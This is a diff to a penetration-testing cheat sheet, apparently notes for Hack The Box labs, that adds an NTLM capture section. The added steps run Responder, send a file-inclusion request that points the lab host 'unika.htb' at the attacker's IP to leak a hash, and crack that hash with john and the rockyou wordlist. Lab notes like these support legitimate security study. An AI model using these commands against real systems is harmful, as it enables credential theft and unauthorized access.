@@ -36,7 +36,21 @@ smbclient -L {IP}
 ```shell
 smbclient \\\\{IP}\\{DIR}
 ```
-* NTLM Challange/Responder, use tool: https://github.com/lgandx/Responder
+### NTLM Challange/Responder
+* Use tool: Responder
+```shell
+git clone https://github.com/lgandx/Responder
+sudo python3 Responder.py -I tun0
+w3m http://unika.htb/index.php?page=//{LOCAL IP}/somefile
+```
+* Wordlists at /usr/share/wordlists
+```shell
+sudo apt install wordlists
+```
+* Use tool: john
+```shell
+john -w=/usr/share/wordlists/rockyou.txt.gz hash.txt
+```
 
 
 ## Redis
